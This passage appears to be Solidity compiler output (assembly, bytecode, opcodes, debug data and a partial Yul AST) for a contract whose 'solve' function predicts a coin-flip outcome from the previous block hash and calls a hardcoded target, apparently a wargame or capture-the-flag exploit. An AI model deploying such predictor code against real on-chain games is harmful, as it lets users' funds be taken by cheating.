    swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3285:3434   */\n    tag_31:\n        /* \"#utility.yul\":3321:3328   */\n      0x00\n        /* \"#utility.yul\":3361:3427   */\n      0xffffffff00000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3354:3359   */\n      dup3\n        /* \"#utility.yul\":3350:3428   */\n      and\n        /* \"#utility.yul\":3339:3428   */\n      swap1\n      pop\n        /* \"#utility.yul\":3285:3434   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3440:3517   */\n    tag_49:\n        /* \"#utility.yul\":3477:3484   */\n      0x00\n        /* \"#utility.yul\":3506:3511   */\n      dup2\n        /* \"#utility.yul\":3495:3511   */\n      swap1\n      pop\n        /* \"#utility.yul\":3440:3517   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3523:3830   */\n    tag_39:\n        /* \"#utility.yul\":3591:3592   */\n      0x00\n        /* \"#utility.yul\":3601:3714   */\n    tag_78:\n        /* \"#utility.yul\":3615:3621   */\n      dup4\n        /* \"#utility.yul\":3612:3613   */\n      dup2\n        /* \"#utility.yul\":3609:3622   */\n      lt\n        /* \"#utility.yul\":3601:3714   */\n      iszero\n      tag_80\n      jumpi\n        /* \"#utility.yul\":3700:3701   */\n      dup1\n        /* \"#utility.yul\":3695:3698   */\n      dup3\n        /* \"#utility.yul\":3691:3702   */\n      add\n        /* \"#utility.yul\":3685:3703   */\n      mload\n        /* \"#utility.yul\":3681:3682   */\n      dup2\n        /* \"#utility.yul\":3676:3679   */\n      dup5\n        /* \"#utility.yul\":3672:3683   */\n      add\n        /* \"#utility.yul\":3665:3704   */\n      mstore\n        /* \"#utility.yul\":3637:3639   */\n      0x20\n        /* \"#utility.yul\":3634:3635   */\n      dup2\n        /* \"#utility.yul\":3630:3640   */\n      add\n        /* \"#utility.yul\":3625:3640   */\n      swap1\n      pop\n        /* \"#utility.yul\":3601:3714   */\n      jump(tag_78)\n    tag_80:\n        /* \"#utility.yul\":3732:3738   */\n      dup4\n        /* \"#utility.yul\":3729:3730   */\n      dup2\n        /* \"#utility.yul\":3726:3739   */\n      gt\n        /* \"#utility.yul\":3723:3824   */\n      iszero\n      tag_81\n      jumpi\n        /* \"#utility.yul\":3812:3813   */\n      0x00\n        /* \"#utility.yul\":3803:3809   */\n      dup5\n        /* \"#utility.yul\":3798:3801   */\n      dup5\n        /* \"#utility.yul\":3794:3810   */\n      add\n        /* \"#utility.yul\":3787:3814   */\n      mstore\n        /* \"#utility.yul\":3723:3824   */\n    tag_81:\n        /* \"#utility.yul\":3572:3830   */\n      pop\n        /* \"#utility.yul\":3523:3830   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3836:4016   */\n    tag_73:\n        /* \"#utility.yul\":3884:3961   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3881:3882   */\n      0x00\n        /* \"#utility.yul\":3874:3962   */\n      mstore\n        /* \"#utility.yul\":3981:3985   */\n      0x11\n        /* \"#utility.yul\":3978:3979   */\n      0x04\n        /* \"#utility.yul\":3971:3986   */\n      mstore\n        /* \"#utility.yul\":4005:4009   */\n      0x24\n        /* \"#utility.yul\":4002:4003   */\n      0x00\n        /* \"#utility.yul\":3995:4010   */\n      revert\n        /* \"#utility.yul\":4022:4202   */\n    tag_67:\n        /* \"#utility.yul\":4070:4147   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":4067:4068   */\n      0x00\n        /* \"#utility.yul\":4060:4148   */\n      mstore\n        /* \"#utility.yul\":4167:4171   */\n      0x12\n        /* \"#utility.yul\":4164:4165   */\n      0x04\n        /* \"#utility.yul\":4157:4172   */\n      mstore\n        /* \"#utility.yul\":4191:4195   */\n      0x24\n        /* \"#utility.yul\":4188:4189   */\n      0x00\n        /* \"#utility.yul\":4181:4196   */\n      revert\n        /* \"#utility.yul\":4208:4367   */\n    tag_45:\n        /* \"#utility.yul\":4348:4359   */\n      0x74727920616761696e0000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":4344:4345   */\n      0x00\n        /* \"#utility.yul\":4336:4342   */\n      dup3\n        /* \"#utility.yul\":4332:4346   */\n      add\n        /* \"#utility.yul\":4325:4360   */\n      mstore\n        /* \"#utility.yul\":4208:4367   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212209560a93a036e17dd1fd7f2f3f74feb3375ad5e8e35b1e839f3daa88f0f6946c164736f6c63430008070033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "60806040527f8000000000000000000000000000000000000000000000000000000000000000600055731b4c3bb63058ce67b9573beffcbf3737e1697f4f600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561008957600080fd5b5061046d806100996000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063890d690814610030575b600080fd5b61003861004e565b6040516100459190610294565b60405180910390f35b60008060016000546001436100639190610307565b4060001c61007191906102d6565b149050801515600160149054906101000a900460ff16151514156100ca576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100c190610274565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d8260405160200161013692919061024b565b6040516020818303038152906040526040516101529190610234565b600060405180830381855af49150503d806000811461018d576040519150601f19603f3d011682016040523d82523d6000602084013e610192565b606091505b50505080600160146101000a81548160ff0219169083151502179055505090565b6101bc8161033b565b82525050565b6101cb81610347565b82525050565b60006101dc826102af565b6101e681856102ba565b93506101f681856020860161037d565b80840191505092915050565b600061020f6009836102c5565b915061021a8261040e565b602082019050919050565b61022e81610373565b82525050565b600061024082846101d1565b915081905092915050565b600060408201905061026060008301856101c2565b61026d60208301846101b3565b9392505050565b6000602082019050818103600083015261028d81610202565b9050919050565b60006020820190506102a96000830184610225565b92915050565b600081519050919050565b600081905092915050565b600082825260208201905092915050565b60006102e182610373565b91506102ec83610373565b9250826102fc576102fb6103df565b5b828204905092915050565b600061031282610373565b915061031d83610373565b9250828210156103305761032f6103b0565b5b828203905092915050565b60008115159050919050565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b6000819050919050565b60005b8381101561039b578082015181840152602081019050610380565b838111156103aa576000848401525b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b7f74727920616761696e000000000000000000000000000000000000000000000060008201525056fea26469706673582212209560a93a036e17dd1fd7f2f3f74feb3375ad5e8e35b1e839f3daa88f0f6946c164736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x0 SSTORE PUSH20 0x1B4C3BB63058CE67B9573BEFFCBF3737E1697F4F PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x89 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x46D DUP1 PUSH2 0x99 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x890D6908 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x4E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x294 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 PUSH1 0x0 SLOAD PUSH1 0x1 NUMBER PUSH2 0x63 SWAP2 SWAP1 PUSH2 0x307 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR PUSH2 0x71 SWAP2 SWAP1 PUSH2 0x2D6 JUMP JUMPDEST EQ SWAP1 POP DUP1 ISZERO ISZERO PUSH1 0x1 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO ISZERO EQ ISZERO PUSH2 0xCA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC1 SWAP1 PUSH2 0x274 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x1D263F678198AFCB61494C86D0B849D04A869F89E604450AE1A549AA6619DD3D DUP3 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x136 SWAP3 SWAP2 SWAP1 PUSH2 0x24B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x152 SWAP2 SWAP1 PUSH2 0x234 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x18D JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x192 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP DUP1 PUSH1 0x1 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP POP SWAP1 JUMP JUMPDEST PUSH2 0x1BC DUP2 PUSH2 0x33B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x1CB DUP2 PUSH2 0x347 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1DC DUP3 PUSH2 0x2AF JUMP JUMPDEST PUSH2 0x1E6 DUP2 DUP6 PUSH2 0x2BA JUMP JUMPDEST SWAP4 POP PUSH2 0x1F6 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x37D JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x20F PUSH1 0x9 DUP4 PUSH2 0x2C5 JUMP JUMPDEST SWAP2 POP PUSH2 0x21A DUP3 PUSH2 0x40E JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x22E DUP2 PUSH2 0x373 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x240 DUP3 DUP5 PUSH2 0x1D1 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x260 PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x1C2 JUMP JUMPDEST PUSH2 0x26D PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x1B3 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x28D DUP2 PUSH2 0x202 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2A9 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x225 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2E1 DUP3 PUSH2 0x373 JUMP JUMPDEST SWAP2 POP PUSH2 0x2EC DUP4 PUSH2 0x373 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x2FC JUMPI PUSH2 0x2FB PUSH2 0x3DF JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x312 DUP3 PUSH2 0x373 JUMP JUMPDEST SWAP2 POP PUSH2 0x31D DUP4 PUSH2 0x373 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x330 JUMPI PUSH2 0x32F PUSH2 0x3B0 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x39B JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x380 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x3AA JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x74727920616761696E0000000000000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP6 PUSH1 0xA9 GASPRICE SUB PUSH15 0x17DD1FD7F2F3F74FEB3375AD5E8E35 0xB1 0xE8 CODECOPY RETURN 0xDA 0xA8 DUP16 0xF PUSH10 0x46C164736F6C63430008 SMOD STOP CALLER ",
							"sourceMap": "810:557:0:-:0;;;850:77;833:94;;957:42;934:65;;;;;;;;;;;;;;;;;;;;810:557;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@solve_140": {
									"entryPoint": 78,
									"id": 140,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"abi_encode_t_bool_to_t_bool_fromStack": {
									"entryPoint": 435,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_bytes4_to_t_bytes4_fromStack": {
									"entryPoint": 450,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 465,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_stringliteral_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4_to_t_string_memory_ptr_fromStack": {
									"entryPoint": 514,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_t_uint256_to_t_uint256_fromStack": {
									"entryPoint": 549,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": 564,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_bytes4_t_bool__to_t_bytes4_t_bool__fromStack_reversed": {
									"entryPoint": 587,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": 628,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed": {
									"entryPoint": 660,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"array_length_t_bytes_memory_ptr": {
									"entryPoint": 687,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 698,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_string_memory_ptr_fromStack": {
									"entryPoint": 709,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_div_t_uint256": {
									"entryPoint": 726,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint256": {
									"entryPoint": 775,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 827,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_bytes4": {
									"entryPoint": 839,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 883,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"copy_memory_to_memory": {
									"entryPoint": 893,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 0
								},
								"panic_error_0x11": {
									"entryPoint": 944,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x12": {
									"entryPoint": 991,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"store_literal_in_memory_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4": {
									"entryPoint": 1038,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:4370:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "66:50:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "83:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "103:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "88:14:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "88:21:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "76:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "76:34:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "76:34:1"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "54:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "61:3:1",
														"type": ""
													}
												],
												"src": "7:109:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "185:52:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "202:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "224:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bytes4",
																			"nodeType": "YulIdentifier",
																			"src": "207:16:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "207:23:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "195:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "195:36:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "195:36:1"
														}
													]
												},
												"name": "abi_encode_t_bytes4_to_t_bytes4_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "173:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "180:3:1",
														"type": ""
													}
												],
												"src": "122:115:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "351:265:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "361:52:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "407:5:1"
																	}
																],
																"functionName": {
																	"name": "array_length_t_bytes_memory_ptr",
																	"nodeType": "YulIdentifier",
																	"src": "375:31:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "375:38:1"
															},
															"variables": [
																{
																	"name": "length",
																	"nodeType": "YulTypedName",
																	"src": "365:6:1",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "422:95:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "505:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "510:6:1"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "429:75:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "429:88:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "422:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "552:5:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "559:4:1",
																				"type": "",
																				"value": "0x20"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "548:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "548:16:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "566:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "571:6:1"
																	}
																],
																"functionName": {
																	"name": "copy_memory_to_memory",
																	"nodeType": "YulIdentifier",
																	"src": "526:21:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "526:52:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "526:52:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "587:23:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "598:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "603:6:1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "594:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "594:16:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "587:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "332:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "339:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "347:3:1",
														"type": ""
													}
												],
												"src": "243:373:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "768:219:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "778:73:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "844:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "849:1:1",
																		"type": "",
																		"value": "9"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "785:58:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "785:66:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "778:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "949:3:1"
																	}
																],
																"functionName": {
																	"name": "store_literal_in_memory_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4",
																	"nodeType": "YulIdentifier",
																	"src": "860:88:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "860:93:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "860:93:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "962:19:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "973:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "978:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "969:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "969:12:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "962:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_stringliteral_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4_to_t_string_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "756:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "764:3:1",
														"type": ""
													}
												],
												"src": "622:365:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1058:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1075:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1098:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "1080:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1080:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1068:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1068:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1068:37:1"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1046:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1053:3:1",
														"type": ""
													}
												],
												"src": "993:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1251:137:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1262:100:1",
															"value": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1349:6:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1358:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1269:79:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1269:93:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "1262:3:1"
																}
															]
														},
														{
